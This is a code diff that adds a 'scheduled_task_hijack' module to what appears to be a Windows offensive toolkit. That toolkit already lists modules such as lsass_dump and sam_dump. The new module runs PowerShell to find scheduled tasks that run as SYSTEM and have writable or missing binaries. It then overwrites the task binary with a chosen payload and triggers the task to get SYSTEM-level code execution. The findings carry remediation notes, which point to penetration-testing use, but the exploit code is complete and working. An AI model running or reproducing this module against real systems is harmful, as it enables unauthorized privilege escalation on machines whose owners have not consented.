@@ -430,6 +430,10 @@ wsl_privesc: {
     description: "WSL (Windows Subsystem for Linux) privilege escalation — abuse WSL interop to escape to Windows SYSTEM context, exploit writable WSL rootfs, or leverage WSL process execution for defense evasion. Enumerates WSL distributions, checks interop settings, and tests cross-boundary attacks",
     args: "--action enum|exploit [--distro DISTRO_NAME] [--payload CMD]",
   },
+scheduled_task_hijack: {
+    description: "Enumerate and exploit writable scheduled task binaries for privilege escalation — find tasks running as SYSTEM with writable executable paths, missing binaries, or writable argument files. Replace the binary or modify arguments to execute arbitrary code as SYSTEM on next trigger",
+    args: "--action enum|exploit [--task TASK_NAME] [--payload PATH]",
+  },
 } as const satisfies Record<string, { description: string; args: string }>
 
 type Program = keyof typeof PROGRAMS
@@ -15139,6 +15143,184 @@ Write-Output "    Or trigger now: wsl -d ${targetDistro} -u root -- /bin/bash -c
   return { output: output.join("\n"), findings }
 }
 
+async function scheduledTaskHijack(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "enum"
+  const task = argVal(args, "--task")
+  const payload = argVal(args, "--payload")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Scheduled Task Hijack — privilege escalation via writable task binaries\n"]
+
+  if (action === "enum") {
+    const script = `
+# Enumerate scheduled tasks running as privileged users with writable binaries
+$tasks = Get-ScheduledTask | Where-Object { $_.State -ne 'Disabled' }
+$hijackable = @()
+$missingBin = @()
+
+foreach ($t in $tasks) {
+    $info = $t | Get-ScheduledTaskInfo -ErrorAction SilentlyContinue
+    $principal = $t.Principal.UserId
+    $runLevel = $t.Principal.RunLevel
+
+    # Only interested in SYSTEM/Admin tasks
+    $isPrivileged = ($principal -match 'SYSTEM|LOCAL SERVICE|NETWORK SERVICE|Administrators' -or $runLevel -eq 'Highest')
+    if (-not $isPrivileged) { continue }
+
+    foreach ($action in $t.Actions) {
+        if ($action.Execute) {
+            $exe = $action.Execute
+            # Resolve environment variables
+            $resolved = [System.Environment]::ExpandEnvironmentVariables($exe)
+            # Remove quotes
+            $resolved = $resolved.Trim('"', "'")
+
+            if (-not (Test-Path $resolved)) {
+                $missingBin += [PSCustomObject]@{
+                    TaskName = $t.TaskName
+                    TaskPath = $t.TaskPath
+                    Principal = $principal
+                    Binary = $resolved
+                    Arguments = $action.Arguments
+                    Status = "MISSING_BINARY"
+                }
+                Write-Output "[!] MISSING BINARY: $($t.TaskPath)$($t.TaskName)"
+                Write-Output "    Principal: $principal"
+                Write-Output "    Binary: $resolved (DOES NOT EXIST)"
+                Write-Output "    Arguments: $($action.Arguments)"
+                Write-Output ""
+                continue
+            }
+
+            # Check if binary is writable
+            $acl = icacls $resolved 2>$null
+            $aclStr = ($acl | Out-String)
+            $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+            $currentSid = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
+            $groups = [System.Security.Principal.WindowsIdentity]::GetCurrent().Groups | ForEach-Object { $_.Value }
+
+            $writable = $false
+            # Check for write permissions
+            if ($aclStr -match 'Everyone.*\(F\)|Everyone.*\(M\)|Everyone.*\(W\)|BUILTIN\\Users.*\(F\)|BUILTIN\\Users.*\(M\)|BUILTIN\\Users.*\(W\)|Authenticated Users.*\(F\)|Authenticated Users.*\(M\)|Authenticated Users.*\(W\)') {
+                $writable = $true
+            }
+
+            # Check parent directory writability for DLL planting
+            $parentDir = Split-Path $resolved -Parent
+            $parentAcl = icacls $parentDir 2>$null
+            $parentAclStr = ($parentAcl | Out-String)
+            $parentWritable = $parentAclStr -match 'Everyone.*\(F\)|Everyone.*\(M\)|Everyone.*\(W\)|BUILTIN\\Users.*\(F\)|BUILTIN\\Users.*\(M\)|BUILTIN\\Users.*\(W\)'
+
+            if ($writable -or $parentWritable) {
+                $hijackable += [PSCustomObject]@{
+                    TaskName = $t.TaskName
+                    TaskPath = $t.TaskPath
+                    Principal = $principal
+                    Binary = $resolved
+                    Arguments = $action.Arguments
+                    BinaryWritable = $writable
+                    DirWritable = $parentWritable
+                }
+                Write-Output "[+] HIJACKABLE: $($t.TaskPath)$($t.TaskName)"
+                Write-Output "    Principal: $principal (RunLevel: $runLevel)"
+                Write-Output "    Binary: $resolved"
+                Write-Output "    Binary writable: $writable | Dir writable: $parentWritable"
+                Write-Output "    Arguments: $($action.Arguments)"
+                Write-Output ""
+            }
+
+            # Check if argument files are writable
+            if ($action.Arguments -and $action.Arguments -match '[A-Za-z]:\\') {
+                $argPaths = [regex]::Matches($action.Arguments, '[A-Za-z]:\\[^\s"]+') | ForEach-Object { $_.Value }
+                foreach ($ap in $argPaths) {
+                    if (Test-Path $ap) {
+                        $argAcl = icacls $ap 2>$null | Out-String
+                        if ($argAcl -match 'Everyone.*\(F\)|Everyone.*\(M\)|Everyone.*\(W\)|BUILTIN\\Users.*\(F\)|BUILTIN\\Users.*\(M\)|BUILTIN\\Users.*\(W\)') {
+                            Write-Output "[+] WRITABLE ARGUMENT: $($t.TaskPath)$($t.TaskName)"
+                            Write-Output "    Argument file: $ap"
+                            Write-Output ""
+                        }
+                    }
+                }
+            }
+        }
+    }
+}
+
+Write-Output "=== Summary ==="
+Write-Output "Hijackable tasks: $($hijackable.Count)"
+Write-Output "Missing binary tasks: $($missingBin.Count)"
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+
+    const hijackMatch = result.stdout.match(/Hijackable tasks: (\d+)/)
+    const missingMatch = result.stdout.match(/Missing binary tasks: (\d+)/)
+    const hijackCount = hijackMatch ? parseInt(hijackMatch[1]) : 0
+    const missingCount = missingMatch ? parseInt(missingMatch[1]) : 0
+
+    if (hijackCount > 0 || missingCount > 0) {
+      findings.push({
+        checkId: "WIN-SCHTASK-HIJACK-001",
+        provider: "windows",
+        severity: "high",
+        status: "VULNERABLE",
+        resource: "schtasks://local",
+        title: `${hijackCount} hijackable + ${missingCount} missing-binary scheduled tasks found`,
+        details: result.stdout.substring(0, 500),
+        remediation: "Fix file ACLs on scheduled task binaries. Remove tasks with missing executables.",
+      })
+    }
+  } else if (action === "exploit" && task) {
+    if (!payload) return { output: "[!] Required: --payload PATH (executable to replace with)", findings }
+
+    const script = `
+$t = Get-ScheduledTask -TaskName '${task}' -ErrorAction SilentlyContinue
+if (-not $t) { Write-Output "[-] Task not found: ${task}"; exit 1 }
+
+$exe = $t.Actions[0].Execute
+$resolved = [System.Environment]::ExpandEnvironmentVariables($exe).Trim('"', "'")
+
+if (-not (Test-Path $resolved)) {
+    # Missing binary — just place our payload there
+    Write-Output "[*] Binary missing: $resolved"
+    Write-Output "[*] Placing payload at missing binary location..."
+    Copy-Item '${payload}' $resolved -Force
+    Write-Output "[+] Payload placed: $resolved"
+    Write-Output "[*] Task will execute payload on next trigger"
+} else {
+    # Backup original and replace
+    $backup = "$resolved.bak"
+    Write-Output "[*] Backing up original: $resolved -> $backup"
+    Copy-Item $resolved $backup -Force -ErrorAction SilentlyContinue
+    Write-Output "[*] Replacing with payload..."
+    Copy-Item '${payload}' $resolved -Force
+    Write-Output "[+] Binary replaced: $resolved"
+    Write-Output "[*] Original backed up to: $backup"
+}
+
+# Trigger the task
+Write-Output "[*] Triggering task..."
+Start-ScheduledTask -TaskName '${task}' -ErrorAction SilentlyContinue
+Write-Output "[+] Task triggered — payload should execute as: $($t.Principal.UserId)"
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+
+    findings.push({
+      checkId: "WIN-SCHTASK-HIJACK-002",
+      provider: "windows",
+      severity: "critical",
+      status: "EXPLOITED",
+      resource: `schtask://${task}`,
+      title: `Scheduled task hijacked: ${task}`,
+      details: `Binary replaced with payload. Task triggered.`,
+      remediation: "Restore original binary from .bak file. Fix ACLs.",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 const dispatch: Record<Program, (args: string[], timeout: number) => Promise<HookResult>> = {
   lsass_dump: lsassDump,
   sam_dump: samDump,
@@ -15227,6 +15409,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   shadow_copy_abuse: shadowCopyAbuse,
   unquoted_service_path: unquotedServicePath,
   wsl_privesc: wslPrivesc,
+  scheduled_task_hijack: scheduledTaskHijack,
 }
 
 export const WinhookTool = Tool.define("winhook", {
